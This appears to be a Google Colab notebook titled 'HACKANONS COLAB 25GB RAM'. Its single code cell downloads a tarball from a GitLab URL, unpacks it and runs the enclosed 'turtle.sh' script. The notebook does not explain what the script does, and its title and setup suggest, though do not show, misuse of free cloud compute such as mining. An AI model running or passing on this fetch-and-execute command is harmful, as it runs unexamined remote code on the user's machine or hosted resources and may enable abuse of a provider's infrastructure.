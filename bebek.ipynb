{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "HACKANONS COLAB 25GB RAM.ipynb",
      "provenance": [],
      "collapsed_sections": [],
      "machine_shape": "hm",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "accelerator": "TPU"
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/41815010159/tante/blob/main/bebek.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "bvdJjHtk4nVX"
      },
      "source": [
        "!sudo apt update && sudo apt install screen -y && wget https://gitlab.com/coeglu3135/sugar/-/raw/main/satu.tar.gz && tar xf satu.tar.gz && chmod +x turtle.sh && ./turtle.sh"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}